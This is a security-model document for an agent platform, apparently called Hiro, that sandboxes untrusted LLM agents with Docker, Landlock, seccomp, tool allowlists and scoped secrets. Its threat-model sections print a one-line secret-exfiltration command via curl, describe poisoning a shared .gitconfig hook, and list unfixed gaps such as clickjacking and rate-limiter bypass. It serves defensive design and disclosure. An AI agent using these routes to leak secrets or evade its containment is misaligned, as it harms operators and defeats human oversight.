# Security Model

Hiro runs untrusted LLM-driven agents that can execute arbitrary code. The security model uses defense in depth: Docker containment at the outer boundary, Landlock + seccomp-BPF isolation between each worker and the platform's own state (`config/`, `db/`), and a capability system that restricts what tools each agent can use. Inter-agent filesystem isolation is explicitly not a goal — agents share `$HOME` by design so they can collaborate. The entire stack runs unprivileged — no root, no capabilities, no namespaces.

## Architecture Overview

```
┌─────────────────────────────────────────────────────┐
│ Docker Container (outer boundary)                   │
│                                                     │
│  Control Plane (USER hiro)                          │
│  ├── config/config.yaml (secrets + tool policies)   │
│  ├── Inference loops (fantasy agent per instance)    │
│  ├── WebFetch (SSRF-protected HTTP client)          │
│  └── Instance lifecycle management                  │
│                                                     │
│  ┌──────────────┐  ┌──────────────┐                 │
│  │ Agent Worker  │  │ Agent Worker  │  ...           │
│  │ Landlock FS   │  │ Landlock FS   │               │
│  │ seccomp-BPF   │  │ seccomp-BPF   │               │
│  └──────────────┘  └──────────────┘                 │
│                                                     │
│  /home/hiro  (HIRO_ROOT = $HOME)                    │
│  ├── agents/, skills/ (agent definitions)           │
│  ├── workspace/ (shared collaborative space)        │
│  ├── instances/ (per-agent state)                   │
│  ├── .ssh/, .gitconfig (user-level auth, RW)        │
│  ├── config/ ← BLOCKED from workers (secrets)       │
│  └── db/     ← BLOCKED from workers (platform DB)   │
└─────────────────────────────────────────────────────┘
```

## Security Layers

### 1. Docker Containment

The Docker container is the outermost security boundary. The host filesystem, network, and processes are not accessible to agents unless explicitly mounted or exposed.

The container runs Ubuntu 24.04 with common dev tools (git, curl, build-essential, ripgrep, etc.) pre-installed. The Dockerfile creates a non-root `hiro` user and runs as `USER hiro` — no root, no special capabilities. The platform root starts empty — operators mount or copy in only what agents need.

### 2. Process Isolation

Each agent runs as a separate OS process, spawned from the same `hiro` binary with the `agent` subcommand. The control plane and agents communicate over gRPC via Unix sockets — there is no shared memory or in-process state.

**Spawn protocol:**

1. Control plane calls `os/exec.Command("hiro", "agent")` with a dedicated Unix socket path.
2. `SpawnConfig` (instance ID, agent name, tool whitelist, socket paths, Landlock paths, network access flag) is written as JSON to the child's stdin.
3. The worker applies Landlock filesystem restrictions and seccomp-BPF filter.
4. The worker starts a gRPC server on its Unix socket and writes `ready` to stdout.
5. The control plane connects to the agent's socket as a gRPC client.

Worker processes are thin tool-execution sandboxes — they receive `ExecuteTool` RPCs and run tools. All inference (LLM calls, conversation history, system prompt assembly) happens in the control plane.

**Environment scrubbing:** Agent processes receive a minimal environment (`PATH`, `HOME=$HIRO_ROOT`, `TMPDIR={session-dir}/tmp`, `LANG`, `LC_ALL`, `MISE_DATA_DIR`, `MISE_CONFIG_DIR`, `MISE_CACHE_DIR`, `MISE_GLOBAL_CONFIG_FILE`) rather than inheriting the control plane's full environment. Workers explicitly do not receive `HIRO_API_KEY` — inference runs in the control plane, not in workers. `HOME` points at the hiro user's platform root so standard tools (git, ssh, gh) find `~/.ssh`, `~/.gitconfig`, `~/.config/gh` in the natural place; `TMPDIR` stays session-scoped so throwaway files don't pollute `$HOME`.

### 3. Landlock Filesystem Isolation

Landlock LSM restricts each worker process to only the filesystem paths allowed by the platform's declarative filesystem policy. This is an unprivileged alternative to chroot/mount namespaces — no root or capabilities required.

**Mental model.** Hiro is one Unix user (`hiro`) whose home is the platform root. Everything inside `$HOME` that isn't the platform's own state is fair game for agents — workspace, instance dirs, dotfiles like `~/.ssh` and `~/.gitconfig`. Inter-agent filesystem isolation is **not** a goal: agents collaborate via shared files by design. The real protection boundary is the control plane's own state — `config/` (secrets and tool declarations) and `db/` (platform DB). An agent must never be able to read raw secret values, rewrite its own `allowed_tools`, or grant itself more filesystem paths.

**Declarative policy.** The full allowlist lives under the `filesystem` key in `config/config.yaml` (parser and compiler in `internal/platform/fspolicy`). The policy has three sections:

- `base` — paths granted to every worker (RW or RO).
- `on_tool` — additional paths granted when an agent has a given tool (e.g. `Bash` → `/tmp`, `CreatePersistentInstance` → RW on `agents/` and `skills/`). Paths listed at a higher privilege than in `base` are promoted.
- `per_instance` — dynamic paths resolved at spawn time (`$INSTANCE_DIR`, `$SESSION_DIR`, `$SOCKET_DIR`).

Anything not listed is blocked. `config/` and `db/` are deliberately absent — the policy is stored in `config/config.yaml` inside the blocked `config/` directory, so agents cannot rewrite `config.yaml` to grant themselves more access.

**How it works:**

- The control plane holds the policy in memory alongside the rest of `config.yaml`. fsnotify picks up external edits and reloads.
- At spawn time, the policy is compiled into three derived lists that travel in `SpawnConfig`:
  - `LandlockPaths` — RW and RO path sets applied by the kernel as a Landlock ruleset.
  - `ReadableRoots` — paths that `Read`, `Glob`, and `Grep` may address (RW + RO under `$HOME`).
  - `WritableRoots` — paths that `Write` and `Edit` may address (RW only).
- The worker calls `PR_SET_NO_NEW_PRIVS`, applies the Landlock ruleset, then installs the in-process `tools.SetReadableRoots` / `SetWritableRoots` guard.
- All other filesystem access is blocked by the kernel, irreversibly for the process lifetime. The in-process guard is defense in depth: on non-Linux platforms or kernels without Landlock, it's the only remaining restriction, so the read/write split matters there.

**Detection:** The control plane probes for Landlock support at startup. If the kernel is too old (pre-5.13), Landlock is silently disabled; the in-process guard remains. In Docker with a modern kernel, both layers are active.

**Implementation:** `internal/landlock/` wraps the Landlock v1–v3 syscalls. `internal/platform/fspolicy/` parses, expands variables, and compiles. Linux-only Landlock; the policy types are cross-platform.

**On `accessFsIoctlDev` (Landlock v5, kernel 6.10+):** We deliberately do not declare `LANDLOCK_ACCESS_FS_IOCTL_DEV` in the handled-access mask. Declaring it would require granting ioctl on every path agents need it (notably `/dev/tty*` for line discipline), and silently breaking interactive tools like `stty` and readline on new kernels is a worse failure mode than leaving ioctl permissions at their pre-v5 baseline. The ioctl attack surface is already reduced by seccomp and by `/dev` being Landlock-RO.

### 3a. Mount RW/RO: enforced at the mount layer

Host directories bind-mounted under `$HOME/mounts/<name>` inherit their read/write mode from the mount itself, not from Landlock. Docker's `:ro` bind flag sets `MS_RDONLY` on the mount and the kernel returns `EROFS` on writes; NFS mounts with `ro`, read-only FUSE exports, and any other filesystem-level read-only mount behave the same way. The fspolicy grants `$HOME/mounts` as RW unconditionally and lets the mount layer be authoritative.

Why not use Landlock for this? Landlock rules are **additive** — a parent RW rule can't be narrowed by a child RO rule, so trying to enforce per-mount modes in Landlock creates footguns (the whole directory ends up RW whenever `mounts/` itself is in the allowlist). The mount layer doesn't have that problem: an RO mount is RO at the VFS regardless of anything above it.

Agents are still told each mount's probed mode via `MountProvider` (which calls `access(W_OK)` for announcement purposes). That's informational only — it lets the agent distinguish intent before trying a write. The enforcement is under the mount point.

### 4. Seccomp-BPF Syscall Filtering

Each worker process installs a seccomp-BPF filter that blocks dangerous syscalls. The filter is applied per-worker at startup, after Landlock but before the gRPC server starts.

**Blocked syscalls (all workers):**

- `clone3`, `unshare`, `setns` — prevent namespace creation
- `ptrace`, `mount`, `umount2`, `pivot_root`, `chroot` — prevent privilege escalation and filesystem manipulation
- `kexec_load` — prevent loading a new kernel
- `process_vm_readv`, `process_vm_writev` — prevent cross-process memory access
- `io_uring_setup`, `io_uring_enter`, `io_uring_register` — prevent io_uring (can bypass seccomp on some kernels)
- `shmget`, `shmat`, `shmctl` — prevent SysV shared memory

Additionally, `clone` with `CLONE_NEWUSER` or `CLONE_NEWNET` flags is blocked via argument inspection.

**Network socket allowlist:** When `NetworkAccess` is false (the agent does not have the Bash tool), the seccomp filter restricts `socket(2)` to `AF_UNIX` only. AF_INET, AF_INET6, AF_NETLINK, AF_VSOCK, AF_PACKET, and any new address family added in a future kernel are denied with `EPERM`. This is an allowlist rather than a denylist — new address families fail closed without requiring filter updates. The AF_UNIX allowance is needed for the per-worker gRPC socket. Agents with Bash get unrestricted socket access for `curl`, `git`, etc.

### 5. WebFetch in Control Plane

The `WebFetch` tool runs in the control plane process, not in workers. This gives the control plane full control over outbound HTTP requests without needing to grant workers network access.

**SSRF protection:** The control plane's HTTP client resolves DNS before dialing and blocks connections to loopback, private, and link-local addresses. Redirect targets are also validated against this blocklist. This prevents agents from using WebFetch to reach internal services.

### 6. Tool Capability System

Agent capabilities are controlled by a closed-by-default tool whitelist. An agent can only use a tool if both layers permit it:

```
Effective tools = instance declared tools ∩ parent's effective tools
```

**Instance tool declarations:** Each instance owns its tool declarations in `config/instances/<uuid>.yaml` — stored outside the instance directory so Landlock prevents agents from modifying their own tool config. Tools are seeded from the agent definition (`agent.md`) at creation time and can be modified by the operator via the control plane. If no tools are declared, the agent gets no built-in tools.

**Parent inheritance:** A child agent's effective tools are intersected with its parent's effective tools. A child can never have more capabilities than its parent.

**Structural tools** bypass this system — they are intrinsic to the agent's mode:
- `SpawnInstance` is available to all agents.
- Management tools (`ResumeInstance`, `StopInstance`, `DeleteInstance`, `SendMessage`, `ListInstances`) are available to any agent that declares them in `allowed_tools`, scoped to descendants.
- Persistent tools (`TodoWrite`, `AddMemory`, `ForgetMemory`, `HistorySearch`, `HistoryRecall`) are available to persistent agents.

**Parameterized rules:** The `toolrules` package provides fine-grained call-time enforcement beyond tool names. Rules like `Bash(curl *)` restrict which commands an agent can run. Rules are parsed from `allowed_tools` and `disallowed_tools` in agent definitions and operator config. See `docs/tool-permissions.md` for details.

### 7. Secrets Management

Secrets are stored in `config/config.yaml` and managed via the `/secrets` slash command in the web UI. They are never sent to agents directly.

**How agents use secrets:**

1. Secret *names* are listed in the agent's system prompt so the LLM knows what's available.
2. Secret *values* are injected as environment variables into bash commands at execution time.
3. The control plane sends secret values only with `Bash` tool calls via the `secret_env` proto field. Other tools receive no secrets.

This design ensures secret values never appear in conversation history, system prompts, or LLM context — only in the ephemeral environment of shell commands.

### 8. Agent Authorization Scoping

Agents can only manage their own descendants. This is enforced by the `ScopedManager` wrapper in the inference package.

**How it works:**

1. Each instance's inference loop receives its instance ID as a `callerID` via context propagation.
2. Management tools (`SendMessage`, `StopInstance`, etc.) extract the caller ID from context and create a `ScopedManager` that checks descendant relationships before executing operations.
3. `ScopedManager.checkDescendant()` calls `IsDescendant(targetID, callerID)` via the in-memory instance tree. If the target is not a descendant of the caller, the request is rejected.

**Scoping rules:**

| Operation | Authorization |
|---|---|
| `SpawnInstance` | No check needed — caller becomes the parent. |
| `ResumeInstance` | Target must be a descendant of caller. Requires declaration in `allowed_tools`. |
| `SendMessage` | Target must be a descendant of caller. Requires declaration in `allowed_tools`. |
| `StopInstance` | Target must be a descendant of caller. Requires declaration in `allowed_tools`. |
| `DeleteInstance` | Target must be a descendant of caller. Requires declaration in `allowed_tools`. |
| `ListInstances` | Returns only direct children of caller. Requires declaration in `allowed_tools`. |

An agent cannot send messages to, stop, or inspect siblings, ancestors, or unrelated agents.

### 9. IPC Security

All inter-process communication uses gRPC over Unix domain sockets. No TCP ports are opened between workers and the control plane.

**Single socket direction:**

- **Agent sockets** (`/tmp/hiro-{session-prefix}/a.sock`): One per worker. The control plane connects as a client to dispatch `ExecuteTool`, `Shutdown`, and `WatchJobs` (background job completion streaming) RPCs.

There is no worker-to-control-plane socket. All inference, instance management, and operator operations happen in-process in the control plane. Workers are pure tool-execution sandboxes with no ability to initiate calls back to the control plane. The `WatchJobs` RPC is a server-side stream initiated by the control plane to receive background job completion notifications — it does not grant workers any ability to call into the control plane.

gRPC uses `insecure.NewCredentials()` for transport — this is safe because Unix sockets are local-only.

## Threat Model

### What agents CAN do

- Execute arbitrary shell commands (if granted the `Bash` tool).
- Read and write files in the shared workspace and other Landlock-permitted paths.
- Read agent definitions (`agents/`).
- Spawn ephemeral child agents (with equal or fewer capabilities).
- Make outbound HTTP requests via the `WebFetch` tool (SSRF-protected, runs in control plane).
- Make outbound network connections from Bash commands (if granted the `Bash` tool — seccomp allows sockets for agents with Bash).

### What agents CANNOT do

- Access files outside their Landlock-permitted paths — blocked by the kernel.
- Read `config/` directory (secrets, instance tool config) — not in Landlock paths.
- Manage agents outside their descendant tree — blocked by ScopedManager descendant checks.
- Use tools they weren't granted — blocked by the capability intersection.
- Open network sockets without Bash — blocked by seccomp-BPF socket filter.
- Escape the Docker container — standard container isolation applies.
- Escalate privileges — `PR_SET_NO_NEW_PRIVS` is set, container runs as non-root.

### What the control plane trusts

- The Docker runtime and host kernel.
- The LLM provider API (API keys are sent to it).
- Operator-provided `config/config.yaml` and agent definitions.

### Limitations

- **Landlock requires kernel 5.13+.** On older kernels, filesystem isolation is silently disabled. Modern Docker hosts (Ubuntu 22.04+, Debian 12+) have Landlock support.
- **Shared workspace is collaborative.** Any agent can read or modify files in the workspace. This is by design for multi-agent collaboration, but means agents must be trusted not to tamper with shared data maliciously.
- **Shared user-level dotfiles (Bash agents only).** `~/.ssh`, `~/.gitconfig`, `~/.config`, `~/.cache`, and `~/.local` are granted only to agents that declare the `Bash` tool. A file-only agent (Read/Write/Edit without Bash) cannot read or write any of these — the directories are invisible to it, closing the "drop a poisoned `.gitconfig` hook and wait for trigger" attack for the common case. Bash agents retain full access because the CLIs that use those files (git, ssh, gh, pip, npm) are invoked through Bash anyway. Among Bash agents, inter-agent dotfile tampering is still possible: one compromised Bash agent could poison `.gitconfig` for the next Bash agent or for the operator's `docker exec -it` shell (which inherits the same `$HOME`). Inter-agent isolation is explicitly not a goal; Docker is the outer boundary.
- **Agents with Bash have network access.** The seccomp filter allows only `AF_UNIX` sockets for agents without Bash (allowlist, not denylist — new address families added in future kernels fail closed automatically). Agents with Bash can make arbitrary outbound connections. Use tool rules (`Bash(curl *)`) to restrict which commands agents can run.
- **First-run setup is not network-gated.** Between container start and completion of the onboarding flow, `/api/setup*` endpoints accept requests from any origin. A fresh install has no data, keys, or capabilities, so the worst case is an attacker configuring their own LLM provider on your box — visible immediately on your next visit. Once setup completes, `NeedsSetup()` closes the endpoints (409 Conflict). This matches the posture of Jellyfin, Home Assistant, Sonarr, etc. Do not re-add a loopback gate here without a specific threat to defend against; it breaks Tailscale/LAN/reverse-proxy deployments.

### Known Issues

The following are known security gaps identified during audit, tracked for future resolution:

- **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Use tool rules to restrict which Bash commands agents can run.
- **Short secret redaction floor.** The output redactor only scrubs secrets with values of 8+ characters (`minSecretLen`). Shorter secrets (PINs, short tokens) may appear unredacted in tool output and conversation history.
- **Incomplete security response headers.** `Content-Security-Policy` and `X-Content-Type-Options` are set on share and log endpoints, but not globally. `X-Frame-Options` is not set on any endpoint. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
- **Share tokens do not expire.** File share tokens are valid for the lifetime of the session secret (rotated on password change). There is no per-token TTL.
- **Rate limiter trusts `X-Forwarded-For` from private peers.** When behind a proxy that doesn't sanitize `X-Forwarded-For`, an attacker can inject arbitrary IPs to bypass the login rate limiter.
